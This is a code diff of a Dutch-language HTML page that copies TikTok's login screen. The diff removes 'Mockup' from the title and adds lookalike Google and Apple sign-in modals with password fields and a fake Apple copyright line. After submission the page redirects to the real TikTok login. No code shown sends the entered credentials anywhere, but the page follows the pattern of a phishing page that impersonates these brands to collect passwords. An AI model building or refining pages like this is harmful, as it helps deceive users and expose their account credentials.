@@ -3,247 +3,313 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inloggen | TikTok Mockup</title>
+    <title>Inloggen | TikTok</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        tiktokbg: '#121212',
+                        tiktokred: '#fe2c55',
+                        tiktokredhover: '#e0244a',
+                        applebg: '#f5f5f7',
+                    }
+                }
+            }
+        }
+    </script>
     <!-- FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        /* Custom basis instellingen om exact op TikTok te lijken */
         body {
             background-color: #121212;
             color: white;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-            margin: 0;
         }
         
-        .social-btn {
+        /* TikTok Knop Styling */
+        .btn-social {
             background-color: rgba(255, 255, 255, 0.12);
             border: 1px solid rgba(255, 255, 255, 0.12);
-            transition: background-color 0.2s;
+            transition: background-color 0.2s ease;
         }
-        
-        .social-btn:hover {
-            background-color: rgba(255, 255, 255, 0.08);
-        }
+        .btn-social:hover { background-color: rgba(255, 255, 255, 0.08); }
 
-        .input-field {
+        .input-dark {
             background-color: rgba(255, 255, 255, 0.12);
             outline: none;
         }
-        
-        .input-field:focus {
-            background-color: rgba(255, 255, 255, 0.12);
-            border: 1px solid rgba(255, 255, 255, 0.34);
+        .input-dark:focus { border: 1px solid rgba(255, 255, 255, 0.34); }
+
+        /* Modal Overlay */
+        .modal-overlay {
+            background-color: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(3px);
         }
 
-        /* Modal styling */
-        .modal-overlay {
-            background-color: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(2px);
+        /* Apple Groep Inputs */
+        .apple-input-group input:first-child {
+            border-top-left-radius: 0.5rem;
+            border-top-right-radius: 0.5rem;
+            border-bottom: none;
+        }
+        .apple-input-group input:last-child {
+            border-bottom-left-radius: 0.5rem;
+            border-bottom-right-radius: 0.5rem;
         }
     </style>
 </head>
-<body class="relative">
+<body class="flex flex-col min-h-screen relative">
 
-    <!-- Header (Logo & Help) -->
-    <header class="flex justify-between items-center p-4 lg:px-6 w-full fixed top-0 left-0 z-10">
-        <div class="flex items-center space-x-1 cursor-pointer">
+    <!-- Header -->
+    <header class="flex justify-between items-center p-4 lg:px-6 w-full absolute top-0">
+        <div class="flex items-center space-x-2 cursor-pointer">
             <i class="fa-brands fa-tiktok text-2xl"></i>
             <span class="text-xl font-bold tracking-tight">TikTok</span>
         </div>
-        <div class="text-sm text-gray-400 hover:text-white cursor-pointer flex items-center space-x-2">
+        <div class="text-sm font-semibold text-gray-300 hover:text-white cursor-pointer flex items-center space-x-2 bg-white/10 px-3 py-1.5 rounded-full">
             <i class="fa-regular fa-circle-question"></i>
             <span>Feedback en hulp</span>
         </div>
     </header>
 
-    <!-- MAIN CONTENT AREA -->
-    <main class="flex-grow flex items-center justify-center mt-16 px-4">
+    <!-- MAIN CONTENT -->
+    <main class="flex-grow flex items-center justify-center mt-20 px-4 w-full max-w-[420px] mx-auto">
         
-        <!-- SCHERM 1: HOOFD INLOG PAGINA -->
-        <div id="view-main" class="w-full max-w-[400px] text-center flex flex-col">
-            <h1 class="text-3xl font-bold mb-4">Log in op TikTok</h1>
+        <!-- ================= VIEW 1: HOOFD MENU ================= -->
+        <div id="view-main" class="w-full text-center flex flex-col">
+            <h1 class="text-3xl font-bold mb-3">Log in op TikTok</h1>
             <p class="text-gray-400 text-sm mb-8 px-4">Beheer je account, bekijk meldingen, reageer op video's en meer.</p>
             
             <div class="space-y-4">
-                <button class="social-btn w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
+                <button class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
                     <i class="fa-solid fa-qrcode absolute left-4 text-lg"></i>
                     <span class="mx-auto">QR-code gebruiken</span>
                 </button>
                 
-                <button onclick="switchView('view-login')" class="social-btn w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
+                <button onclick="switchView('view-login')" class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
                     <i class="fa-regular fa-user absolute left-4 text-lg"></i>
-                    <span class="mx-auto truncate">Telefoonnummer/e-mailadres/gebruikersnaam...</span>
+                    <span class="mx-auto truncate">Telefoonnummer/e-mailadres/gebruikersnaam</span>
                 </button>
                 
-                <button class="social-btn w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
-                    <i class="fa-brands fa-facebook absolute left-4 text-lg text-blue-500"></i>
+                <button class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
+                    <i class="fa-brands fa-facebook absolute left-4 text-lg text-[#1877F2]"></i>
                     <span class="mx-auto">Doorgaan met Facebook</span>
                 </button>
                 
-                <button onclick="openModal('modal-google')" class="social-btn w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
-                    <i class="fa-brands fa-google absolute left-4 text-lg"></i>
+                <button onclick="openModal('modal-google')" class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
+                    <!-- Google SVG icoon voor realisme -->
+                    <svg class="absolute left-4 w-5 h-5" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                     <span class="mx-auto">Doorgaan met Google</span>
                 </button>
                 
-                <button onclick="openModal('modal-apple')" class="social-btn w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
-                    <i class="fa-brands fa-apple absolute left-4 text-lg"></i>
+                <button onclick="openModal('modal-apple')" class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
+                    <i class="fa-brands fa-apple absolute left-4 text-xl"></i>
                     <span class="mx-auto">Doorgaan met Apple</span>
                 </button>
             </div>
             
-            <p class="text-[11px] text-gray-500 mt-20 px-8">
-                Als je doorgaat, ga je akkoord met de <a href="#" class="font-bold hover:underline">Gebruiksvoorwaarden</a> van TikTok en bevestig je dat je het <a href="#" class="font-bold hover:underline">Privacybeleid</a> van TikTok hebt gelezen.
+            <p class="text-xs text-gray-500 mt-20 px-4 leading-relaxed">
+                Als je doorgaat, ga je akkoord met de <a href="#" class="font-bold hover:underline text-gray-300">Gebruiksvoorwaarden</a> van TikTok en bevestig je dat je het <a href="#" class="font-bold hover:underline text-gray-300">Privacybeleid</a> van TikTok hebt gelezen.
             </p>
         </div>
 
-        <!-- SCHERM 2: E-MAIL/WACHTWOORD INLOGGEN (Standaard verborgen) -->
-        <div id="view-login" class="w-full max-w-[400px] text-center flex flex-col hidden">
+        <!-- ================= VIEW 2: E-MAIL / WACHTWOORD ================= -->
+        <div id="view-login" class="w-full text-center flex flex-col hidden">
             <h1 class="text-3xl font-bold mb-8">Inloggen</h1>
             
+            <!-- Tabs -->
             <div class="flex border-b border-gray-700 mb-6 text-[15px] font-semibold">
-                <div class="w-1/2 pb-2 border-b-2 border-white cursor-pointer">
+                <div class="w-1/2 pb-3 border-b-2 border-white cursor-pointer">
                     E-mailadres of<br>gebruikersnaam
                 </div>
-                <div class="w-1/2 pb-2 text-gray-500 hover:text-gray-300 cursor-pointer">
+                <div class="w-1/2 pb-3 text-gray-500 hover:text-gray-300 cursor-pointer">
                     Inloggen met<br>telefoonnummer
                 </div>
             </div>
             
-            <div class="flex flex-col space-y-3 mb-4">
-                <input type="text" id="username" placeholder="E-mailadres of gebruikersnaam" class="input-field w-full py-3 px-4 rounded border border-transparent text-[15px] placeholder-gray-500">
+            <!-- Inputs -->
+            <div class="flex flex-col space-y-3 mb-3">
+                <input type="text" id="tt-user" placeholder="E-mailadres of gebruikersnaam" class="input-dark w-full py-3 px-4 rounded border border-transparent text-[15px] placeholder-gray-500">
                 
                 <div class="relative">
-                    <input type="password" id="password" placeholder="Wachtwoord" class="input-field w-full py-3 px-4 rounded border border-transparent text-[15px] placeholder-gray-500">
-                    <i class="fa-regular fa-eye-slash absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 cursor-pointer"></i>
+                    <input type="password" id="tt-pass" placeholder="Wachtwoord" class="input-dark w-full py-3 px-4 rounded border border-transparent text-[15px] placeholder-gray-500">
+                    <i class="fa-regular fa-eye-slash absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 cursor-pointer hover:text-gray-300"></i>
                 </div>
             </div>
             
             <div class="text-left mb-6">
-                <a href="#" class="text-[13px] text-gray-400 hover:underline font-semibold">Wachtwoord vergeten?</a>
+                <a href="#" class="text-[13px] font-semibold text-gray-400 hover:text-white hover:underline">Wachtwoord vergeten?</a>
             </div>
             
-            <!-- Inlogknop (Begint grijs, wordt rood via JS) -->
-            <button id="login-btn" class="w-full py-3 rounded font-semibold text-[15px] bg-[#3f3f3f] text-gray-400 cursor-not-allowed transition-colors duration-300">
+            <!-- Inloggen Knop (Logica in JS) -->
+            <button id="btn-login-tiktok" onclick="triggerAppRedirect()" disabled class="w-full py-3 rounded font-bold text-[15px] bg-[#3f3f3f] text-gray-400 cursor-not-allowed transition-colors duration-200">
                 Inloggen
             </button>
             
             <div class="mt-8">
-                <button onclick="switchView('view-main')" class="text-sm font-semibold hover:underline">
-                    <i class="fa-solid fa-angle-left mr-1"></i> Terug
+                <button onclick="switchView('view-main')" class="text-sm font-semibold text-gray-300 hover:text-white hover:underline flex items-center justify-center mx-auto space-x-2">
+                    <i class="fa-solid fa-angle-left"></i> <span>Terug</span>
                 </button>
             </div>
         </div>
 
     </main>
 
-    <!-- PRE-FOOTER (Heb je geen account) -->
-    <div class="w-full border-t border-gray-800 py-6 text-center text-[15px]">
-        Heb je geen account? <a href="#" class="text-[#fe2c55] font-semibold hover:underline">Aanmelden</a>
+    <!-- Footer Area -->
+    <div class="w-full mt-auto flex flex-col">
+        <div class="border-t border-gray-800 py-6 text-center text-[15px]">
+            Heb je geen account? <a href="#" class="text-tiktokred font-bold hover:underline">Aanmelden</a>
+        </div>
+        
+        <footer class="border-t border-gray-800 p-4 pb-6 flex justify-between items-center text-[13px] text-gray-500 font-semibold px-4 lg:px-8">
+            <select class="bg-transparent border border-gray-700 rounded px-2 py-1 outline-none text-gray-400">
+                <option>Nederlands</option>
+                <option>English</option>
+            </select>
+            <div>© 2026 TikTok</div>
+        </footer>
     </div>
 
-    <!-- FOOTER (Language & Copyright) -->
-    <footer class="w-full border-t border-gray-800 p-4 flex justify-between items-center text-xs text-gray-500">
-        <select class="bg-transparent border border-gray-700 rounded px-2 py-1 outline-none">
-            <option>Nederlands</option>
-            <option>English</option>
-        </select>
-        <div>
-            © 2026 TikTok
-        </div>
-    </footer>
 
-    <!-- ================= MODALS ================= -->
-
-    <!-- GOOGLE MODAL -->
-    <div id="modal-google" class="fixed inset-0 modal-overlay hidden flex items-center justify-center z-50">
-        <div class="bg-white text-black w-11/12 max-w-md rounded-xl shadow-2xl p-6 relative">
-            <button onclick="closeModals()" class="absolute top-4 right-4 text-gray-500 hover:text-black">
-                <i class="fa-solid fa-xmark text-xl"></i>
+    <!-- ================= MODAL: GOOGLE ================= -->
+    <div id="modal-google" class="fixed inset-0 modal-overlay hidden z-50 flex items-center justify-center p-4">
+        <div class="bg-white text-[#202124] w-full max-w-[400px] rounded-2xl shadow-2xl p-8 relative font-sans" onclick="event.stopPropagation()">
+            <!-- Close Button -->
+            <button onclick="closeModals()" class="absolute top-4 right-4 text-gray-500 hover:text-gray-800 w-8 h-8 rounded-full hover:bg-gray-100 flex items-center justify-center">
+                <i class="fa-solid fa-xmark text-lg"></i>
             </button>
             
-            <div class="text-center mb-6 mt-4">
-                <i class="fa-brands fa-google text-4xl text-blue-500 mb-4"></i>
-                <h2 class="text-2xl font-normal" style="font-family: 'Product Sans', Arial, sans-serif;">Inloggen met Google</h2>
-                <p class="text-gray-600 mt-2">Kies een account om door te gaan naar TikTok</p>
+            <div class="text-center mb-6">
+                <!-- Google Logo -->
+                <svg class="mx-auto w-10 h-10 mb-3" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+                <h2 class="text-[24px] mb-1">Inloggen</h2>
+                <p class="text-[15px] mb-4">Doorgaan naar TikTok</p>
             </div>
             
-            <div class="border border-gray-300 rounded-lg p-3 flex items-center cursor-pointer hover:bg-gray-50 mb-6">
-                <div class="w-10 h-10 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold text-lg mr-3">
-                    U
+            <div class="space-y-4">
+                <div class="relative">
+                    <input type="text" id="g-email" class="block rounded-md px-3 pb-2.5 pt-5 w-full text-sm border border-gray-300 appearance-none focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" ">
+                    <label for="g-email" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-3 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">E-mailadres of telefoonnummer</label>
                 </div>
-                <div>
-                    <div class="font-semibold text-sm">User Naam</div>
-                    <div class="text-xs text-gray-500">user@gmail.com</div>
+
+                <div class="relative">
+                    <input type="password" id="g-pass" class="block rounded-md px-3 pb-2.5 pt-5 w-full text-sm border border-gray-300 appearance-none focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" ">
+                    <label for="g-pass" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-3 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">Wachtwoord</label>
                 </div>
+                
+                <a href="#" class="text-[14px] text-blue-600 font-medium hover:underline inline-block mt-1">Wachtwoord vergeten?</a>
+            </div>
+
+            <p class="text-xs text-gray-500 mt-8 mb-8">
+                Voordat je deze app gaat gebruiken, kun je het <a href="#" class="text-blue-600 hover:underline">Privacybeleid</a> en de <a href="#" class="text-blue-600 hover:underline">Servicevoorwaarden</a> van TikTok doorlezen.
+            </p>
+
+            <div class="flex justify-between items-center mt-6">
+                <a href="#" class="text-blue-600 text-[14px] font-medium hover:bg-blue-50 px-2 py-1 rounded">Account maken</a>
+                <button onclick="triggerAppRedirect()" class="bg-[#0b57d0] hover:bg-[#0842a0] text-white px-6 py-2 rounded-full font-medium text-[14px] transition">
+                    Volgende
+                </button>
             </div>
         </div>
     </div>
 
-    <!-- APPLE MODAL -->
-    <div id="modal-apple" class="fixed inset-0 modal-overlay hidden flex items-center justify-center z-50">
-        <div class="bg-[#f5f5f7] text-black w-11/12 max-w-sm rounded-2xl shadow-2xl overflow-hidden relative" style="font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
+
+    <!-- ================= MODAL: APPLE ================= -->
+    <div id="modal-apple" class="fixed inset-0 modal-overlay hidden z-50 flex items-center justify-center p-4">
+        <div class="bg-applebg text-black w-full max-w-[420px] rounded-2xl shadow-2xl overflow-hidden relative" onclick="event.stopPropagation()">
             
-            <!-- Apple Window Header -->
-            <div class="bg-[#e8e8ed] py-2 px-4 flex justify-end">
-                <button onclick="closeModals()" class="w-3 h-3 bg-red-500 rounded-full hover:bg-red-600 cursor-pointer"></button>
+            <!-- Apple Top Bar -->
+            <div class="bg-white border-b border-gray-200 px-4 py-3 flex justify-between items-center">
+                <i class="fa-brands fa-apple text-xl"></i>
+                <div class="font-semibold text-[15px]">Apple Account</div>
+                <button onclick="closeModals()" class="text-gray-400 hover:text-black">
+                    <i class="fa-solid fa-xmark text-lg"></i>
+                </button>
             </div>
             
-            <div class="p-8 text-center flex flex-col items-center">
-                <i class="fa-brands fa-apple text-5xl mb-4"></i>
-                <h2 class="text-2xl font-semibold mb-2">Log in met Apple</h2>
-                <p class="text-sm text-gray-600 mb-8">Gebruik je Apple ID om in te loggen bij TikTok.</p>
+            <div class="p-8 pb-10 text-center flex flex-col items-center">
+                <!-- App Icon -->
+                <div class="bg-black text-white w-16 h-16 rounded-xl flex items-center justify-center shadow-md mb-6">
+                    <i class="fa-brands fa-tiktok text-4xl"></i>
+                </div>
                 
-                <input type="text" placeholder="Apple ID" class="w-full p-3 border border-gray-300 rounded-t-lg outline-none focus:border-blue-500 mb-0 border-b-0">
-                <input type="password" placeholder="Wachtwoord" class="w-full p-3 border border-gray-300 rounded-b-lg outline-none focus:border-blue-500 mb-6">
+                <h2 class="text-[20px] font-medium mb-6 leading-snug">Gebruik je Apple Account<br>om in te loggen op TikTok</h2>
                 
-                <button class="bg-black text-white w-full py-3 rounded-lg font-semibold hover:bg-gray-800 transition">
+                <!-- Inputs Grouped -->
+                <div class="w-full apple-input-group mb-8 shadow-sm">
+                    <input type="text" placeholder="Apple ID" class="w-full p-3.5 border border-gray-300 outline-none focus:border-[#0070c9] focus:ring-1 focus:ring-[#0070c9] focus:z-10 relative bg-white text-[15px]">
+                    <input type="password" placeholder="Wachtwoord" class="w-full p-3.5 border border-gray-300 outline-none focus:border-[#0070c9] focus:ring-1 focus:ring-[#0070c9] focus:z-10 relative bg-white text-[15px]">
+                </div>
+                
+                <!-- Privacy Disclaimer -->
+                <div class="mb-6 flex flex-col items-center">
+                    <i class="fa-solid fa-user-group text-[#0070c9] text-2xl mb-2"></i>
+                    <p class="text-[12px] text-gray-500 leading-relaxed px-2">
+                        Bij het instellen van 'Log in met Apple' wordt mogelijk de informatie over je interacties met Apple en dit apparaat, gebruikt door Apple ter voorkoming van fraude. 
+                        <a href="#" class="text-[#0070c9] hover:underline">Bekijk hoe je gegevens worden beheerd...</a>
+                    </p>
+                </div>
+                
+                <!-- Action Button -->
+                <button onclick="triggerAppRedirect()" class="bg-[#0070c9] hover:bg-[#005ea6] text-white w-full py-3.5 rounded-xl font-semibold text-[16px] transition shadow-sm">
                     Ga door
                 </button>
+                
+                <div class="mt-8 pt-6 border-t border-gray-300 w-full flex flex-col gap-1 text-[11px] text-gray-400">
+                    <p>Copyright © 2026 Apple Inc. Alle rechten voorbehouden.</p>
+                    <p><a href="#" class="hover:underline">Privacybeleid</a> <span class="mx-1">|</span> <a href="#" class="hover:underline">Gebruik van cookies</a></p>
+                </div>
             </div>
         </div>
     </div>
 
     <!-- JAVASCRIPT LOGICA -->
     <script>
-        // Functie om te wisselen tussen de hoofd inlogpagina en het formulier
+        // --- 1. Navigatie Logica (Single Page) ---
         function switchView(viewId) {
             document.getElementById('view-main').classList.add('hidden');
             document.getElementById('view-login').classList.add('hidden');
-            
             document.getElementById(viewId).classList.remove('hidden');
         }
 
-        // --- Logica voor de Inlog-knop validatie ---
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const loginBtn = document.getElementById('login-btn');
+        // --- 2. Dynamische Inlogknop (TikTok Login Pagina) ---
+        const userInput = document.getElementById('tt-user');
+        const passInput = document.getElementById('tt-pass');
+        const loginBtn = document.getElementById('btn-login-tiktok');
 
-        function checkInputs() {
-            // Check of beide velden tekst bevatten
-            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
-                // Maak knop actief (TikTok Rood)
+        function checkFormFields() {
+            if (userInput.value.trim() !== '' && passInput.value.trim() !== '') {
+                // Maak knop actief (Rood)
+                loginBtn.disabled = false;
                 loginBtn.classList.remove('bg-[#3f3f3f]', 'text-gray-400', 'cursor-not-allowed');
-                loginBtn.classList.add('bg-[#fe2c55]', 'text-white', 'cursor-pointer', 'hover:bg-[#e0274c]');
+                loginBtn.classList.add('bg-tiktokred', 'text-white', 'cursor-pointer', 'hover:bg-tiktokredhover');
             } else {
                 // Maak knop inactief (Grijs)
+                loginBtn.disabled = true;
                 loginBtn.classList.add('bg-[#3f3f3f]', 'text-gray-400', 'cursor-not-allowed');
-                loginBtn.classList.remove('bg-[#fe2c55]', 'text-white', 'cursor-pointer', 'hover:bg-[#e0274c]');
+                loginBtn.classList.remove('bg-tiktokred', 'text-white', 'cursor-pointer', 'hover:bg-tiktokredhover');
             }
         }
 
-        // Luister naar typen in de input velden
-        usernameInput.addEventListener('input', checkInputs);
-        passwordInput.addEventListener('input', checkInputs);
+        userInput.addEventListener('input', checkFormFields);
+        passInput.addEventListener('input', checkFormFields);
 
-        // --- Logica voor de Modals (Popups) ---
+        // --- 3. Modals / Pop-ups Logica ---
         function openModal(modalId) {
-            document.getElementById(modalId).classList.remove('hidden');
+            const modal = document.getElementById(modalId);
+            modal.classList.remove('hidden');
+            // Reset animatie voor soepele vertoning
+            modal.querySelector('div').style.transform = 'scale(0.95)';
+            modal.querySelector('div').style.opacity = '0';
+            setTimeout(() => {
+                modal.querySelector('div').style.transition = 'all 0.2s ease-out';
+                modal.querySelector('div').style.transform = 'scale(1)';
+                modal.querySelector('div').style.opacity = '1';
+            }, 10);
         }
 
         function closeModals() {
@@ -251,13 +317,22 @@
             document.getElementById('modal-apple').classList.add('hidden');
         }
 
-        // Sluit modal als je buiten de witte box (op de overlay) klikt
-        window.onclick = function(event) {
-            const googleModal = document.getElementById('modal-google');
-            const appleModal = document.getElementById('modal-apple');
-            if (event.target === googleModal || event.target === appleModal) {
+        // Sluit modal als er op de donkere achtergrond (overlay) wordt geklikt
+        document.querySelectorAll('.modal-overlay').forEach(overlay => {
+            overlay.addEventListener('click', function() {
                 closeModals();
-            }
+            });
+        });
+
+        // --- 4. Deep-link Redirect Functie ---
+        function triggerAppRedirect() {
+            // Probeer de TikTok app te openen via het custom schema
+            window.location.href = "snssdk1233://";
+            
+            // Stel een timer in. Als de app niet opent, redirect naar tiktok.com
+            setTimeout(function() {
+                window.location.href = "https://www.tiktok.com/login";
+            }, 2500); // 2.5 seconden fallback
         }
     </script>
 </body>
